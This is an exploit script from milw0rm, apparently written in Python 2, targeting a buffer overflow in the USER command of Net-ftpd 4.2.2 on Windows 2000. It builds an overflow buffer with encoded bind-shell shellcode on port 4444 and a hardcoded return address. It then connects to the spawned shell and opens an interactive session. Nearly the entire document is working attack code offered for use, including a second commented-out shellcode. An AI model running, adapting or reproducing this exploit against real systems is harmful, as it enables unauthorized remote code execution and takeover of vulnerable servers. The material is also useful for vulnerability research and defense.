#
# Net-ftpd 4.2.2 user autentication b0f exploit (0day)
# coded by Sergio 'shadown' Alvarez
#

import struct
import socket
import sys
import time

class warftpd:
	def __init__(self, host, port):
		self.host		= host
		self.port		= port
		self.bsize		= 512
		self.ebpaddr	= 0xcacacaca
		self.retaddr	= 0xdeadbeef
		self.sctype		= 'findskt'
		self.scport		= None

	def setebpaddr(self, addr):
		self.ebpaddr = addr

	def setretaddr(self, addr):
		self.retaddr = addr

	def setbsize(self, size):
		self.bsize = size

	def setsctype(self, type):
		self.sctype = type

	def setscport(self, port):
		self.scport = port

	def genbuffer(self):
		## 
		# Alpha port bind 4444, thanx metasploit
		## 
		sc = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
		sc += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x51\x5a\x6a\x46"
		sc += "\x58\x30\x41\x31\x50\x42\x41\x6b\x42\x41\x56\x42\x32\x42\x41\x32"
		sc += "\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x69\x79\x6b\x4c\x70"
		sc += "\x6a\x78\x6b\x70\x4f\x6d\x38\x59\x69\x49\x6f\x69\x6f\x6b\x4f\x61"
		sc += "\x70\x4c\x4b\x70\x6c\x35\x74\x66\x44\x6c\x4b\x73\x75\x45\x6c\x4c"
		sc += "\x4b\x31\x6c\x55\x55\x62\x58\x54\x41\x38\x6f\x6e\x6b\x50\x4f\x57"
		sc += "\x68\x4c\x4b\x33\x6f\x65\x70\x56\x61\x38\x6b\x69\x73\x50\x30\x37"
		sc += "\x39\x6c\x4b\x50\x34\x4e\x6b\x77\x71\x58\x6e\x34\x71\x4b\x70\x4a"
		sc += "\x39\x6e\x4c\x6b\x34\x4f\x30\x64\x34\x35\x57\x6b\x71\x6b\x7a\x56"
		sc += "\x6d\x53\x31\x78\x42\x7a\x4b\x69\x64\x35\x6b\x32\x74\x61\x34\x76"
		sc += "\x48\x44\x35\x4d\x33\x4c\x4b\x63\x6f\x56\x44\x37\x71\x5a\x4b\x50"
		sc += "\x66\x6e\x6b\x66\x6c\x32\x6b\x4c\x4b\x31\x4f\x45\x4c\x75\x51\x38"
		sc += "\x6b\x34\x43\x76\x4c\x4c\x4b\x6b\x39\x72\x4c\x45\x74\x47\x6c\x63"
		sc += "\x51\x7a\x63\x45\x61\x4f\x30\x53\x54\x4e\x6b\x67\x30\x30\x30\x4c"
		sc += "\x4b\x63\x70\x34\x4c\x4e\x6b\x34\x30\x37\x6c\x4e\x4d\x4e\x6b\x71"
		sc += "\x50\x55\x58\x61\x4e\x73\x58\x6e\x6e\x70\x4e\x64\x4e\x68\x6c\x70"
		sc += "\x50\x4b\x4f\x6b\x66\x30\x31\x49\x4b\x50\x66\x52\x73\x53\x56\x30"
		sc += "\x68\x74\x73\x57\x42\x43\x58\x61\x67\x61\x63\x75\x62\x63\x6f\x36"
		sc += "\x34\x49\x6f\x58\x50\x45\x38\x4a\x6b\x4a\x4d\x39\x6c\x57\x4b\x56"
		sc += "\x30\x69\x6f\x5a\x76\x43\x6f\x4d\x59\x78\x65\x35\x36\x4c\x41\x48"
		sc += "\x6d\x66\x68\x37\x72\x71\x45\x62\x4a\x64\x42\x6b\x4f\x38\x50\x35"
		sc += "\x38\x6e\x39\x64\x49\x7a\x55\x4c\x6d\x31\x47\x79\x6f\x6e\x36\x56"
		sc += "\x33\x62\x73\x72\x73\x30\x53\x71\x43\x77\x33\x30\x53\x67\x33\x36"
		sc += "\x33\x59\x6f\x7a\x70\x30\x66\x70\x68\x76\x71\x73\x6c\x41\x76\x72"
		sc += "\x73\x6f\x79\x7a\x41\x4c\x55\x32\x48\x4c\x64\x44\x5a\x74\x30\x4a"
		sc += "\x67\x56\x37\x49\x6f\x4a\x76\x51\x7a\x44\x50\x42\x71\x53\x65\x6b"
		sc += "\x4f\x38\x50\x30\x68\x6f\x54\x4e\x4d\x44\x6e\x79\x79\x30\x57\x79"
		sc += "\x6f\x68\x56\x41\x43\x30\x55\x4b\x4f\x4a\x70\x52\x48\x4d\x35\x67"
		sc += "\x39\x6f\x76\x30\x49\x33\x67\x6b\x4f\x4a\x76\x72\x70\x63\x64\x61"
		sc += "\x44\x30\x55\x49\x6f\x38\x50\x4c\x53\x65\x38\x4b\x57\x72\x59\x6a"
		sc += "\x66\x63\x49\x72\x77\x69\x6f\x78\x56\x41\x45\x4b\x4f\x6a\x70\x70"
		sc += "\x66\x70\x6a\x63\x54\x61\x76\x30\x68\x43\x53\x72\x4d\x6c\x49\x68"
		sc += "\x65\x53\x5a\x70\x50\x53\x69\x76\x49\x6a\x6c\x6f\x79\x4d\x37\x61"
		sc += "\x7a\x67\x34\x4e\x69\x59\x72\x37\x41\x6b\x70\x6a\x53\x4c\x6a\x59"
		sc += "\x6e\x53\x72\x56\x4d\x59\x6e\x33\x72\x64\x6c\x6c\x53\x4e\x6d\x42"
		sc += "\x5a\x35\x68\x4c\x6b\x6e\x4b\x4e\x4b\x72\x48\x44\x32\x6b\x4e\x4d"
		sc += "\x63\x54\x56\x79\x6f\x43\x45\x32\x64\x6b\x4f\x6b\x66\x33\x6b\x53"
		sc += "\x67\x30\x52\x63\x61\x66\x31\x52\x71\x53\x5a\x74\x41\x56\x31\x32"
		sc += "\x71\x73\x65\x50\x51\x4b\x4f\x5a\x70\x32\x48\x6c\x6d\x4a\x79\x47"
		sc += "\x75\x48\x4e\x62\x73\x6b\x4f\x7a\x76\x61\x7a\x6b\x4f\x6b\x4f\x35"
		sc += "\x67\x6b\x4f\x68\x50\x6e\x6b\x31\x47\x4b\x4c\x6d\x53\x68\x44\x41"
		sc += "\x74\x4b\x4f\x4e\x36\x36\x32\x49\x6f\x68\x50\x75\x38\x6c\x30\x4f"
		sc += "\x7a\x56\x64\x31\x4f\x43\x63\x59\x6f\x4a\x76\x4b\x4f\x38\x50\x46"
		
		# shellcode
		#sc		=	"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
		#sc		+=	"\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
		#sc		+=	"\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
		#sc		+=	"\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
		#sc		+=	"\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
		#sc		+=	"\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
		#sc		+=	"\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
		#sc		+=	"\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
		#sc		+=	"\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
		#sc		+=	"\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
		#sc		+=	"\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
		#sc		+=	"\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
		#sc		+=	"\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
		#sc		+=	"\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
		#sc		+=	"\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
		#sc		+=	"\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
		#sc		+=	"\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
		#sc		+=	"\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
		#sc		+=	"\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
		#sc		+=	"\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
		#sc		+=	"\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
		#sc		+=	"\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
		#sc		+=	"\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
		#sc		+=	"\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
		#sc		+=	"\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"
		# other stuff
		nops	=	"\x41"*(self.bsize-len(sc)-50)
		ebp	=	struct.pack('<L', self.ebpaddr)
		# check if the value is an integer, otherwise it should be a string
		if self.retaddr.__class__.__name__ == 'int':
			ret	=	struct.pack('<L', self.retaddr)
		else:
			ret	=	self.retaddr
		# assemble buffer to send
		buffer	=	"USER "
		buffer	+=	nops
		buffer	+=	sc
		buffer	+=	'\x42'*(50-4)
		buffer	+=	ebp
		buffer	+=	ret
		return buffer

	def exploit(self):
		# connect
		skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			skt.connect((self.host, self.port))
		except socket.error, err:
			print "[-] Error: %s" % err[1]
			return None
		print "[+] Connected to %s:%d" % (self.host, self.port)
		# recv banner
		print "[+] Receiving Banner"
		res = skt.recv(100)
		print res
		# send payload
		time.sleep(1)
		print "[+] Sending payload"
		skt.send(self.genbuffer())
		time.sleep(2) # test on mcafee anti-b0f
		skt.close()
		# if successfull connect to the shell
		time.sleep(2)
		skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			skt.connect((self.host, 4444))
		except socket.error, err:
			print "[-] Error: %s" % err[1]
			print "[-] Explotation failed\n[-] Daemon should be dead..."
			return None
		print "[+] Connected to shell at %s on port %d" % (self.host, 4444)
		res = skt.recv(1024)
		if res:
			if res.count('Microsoft Windows'):
				print "[+] Welcome my lord, i'm here to serve you ;) ...\n"
				from telnetlib import Telnet
				telnet = Telnet()
				telnet.sock = skt
				try:
					telnet.interact()
				except:
					pass
				skt.close()
				print "[-] Bye..bye I hope you've enjoyed your stay.. ;)"
				return None
		skt.close()
		print '[-] Explotation failed\nDaemon should be dead...'

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print "*************************************"
		print "* Coded by Sergio 'shadown' Alvarez *"
		print "*          shadown@gmail.com        *"
		print "*************************************"
		print "Usage: %s host port" % sys.argv[0]
		sys.exit(1)

	exp = warftpd(sys.argv[1], int(sys.argv[2]))
	exp.setsctype('findskt')
	exp.setscport(1234)
	exp.setbsize(1014)
	exp.setebpaddr(0xdeadbeef) # sometimes needed, just in case
	exp.setretaddr('\x4c\xfa\x12\x00') # Universal Win2k SP0/SP1/SP2/SP3/SP4 (jmp to our input buffer)
	exp.exploit()

# milw0rm.com [2005-04-26]
